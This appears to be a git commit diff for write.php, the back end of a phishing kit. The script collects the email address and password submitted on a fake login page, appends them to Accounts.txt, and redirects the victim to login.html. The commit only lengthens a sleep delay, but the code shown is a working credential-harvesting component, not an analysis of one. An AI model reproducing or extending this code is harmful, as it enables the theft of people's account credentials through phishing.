c47192144b5b284582d7e273bef3fff442b4be5b
bobstottts <bobstottts@googlemail.com>
2017-07-21 21:14:56 +0600

    Update write.php

--- a69898h8hf46990kko08609934m/write.php
+++ a69898h8hf46990kko08609934m/write.php
@@ -2,7 +2,7 @@
   $data = sprintf("Account Information\r{\n\tEmail: %s\n\tPassword: %s\n}\n\n================\n\n", $_POST['email'], $_POST['pass']);
   $file = "Accounts.txt"; 
   file_put_contents($file, $data, FILE_APPEND);
-  sleep(1.5)
+  sleep(10.5)
 ?>
 <meta http-equiv="refresh" content="0; url=login.html" />
 
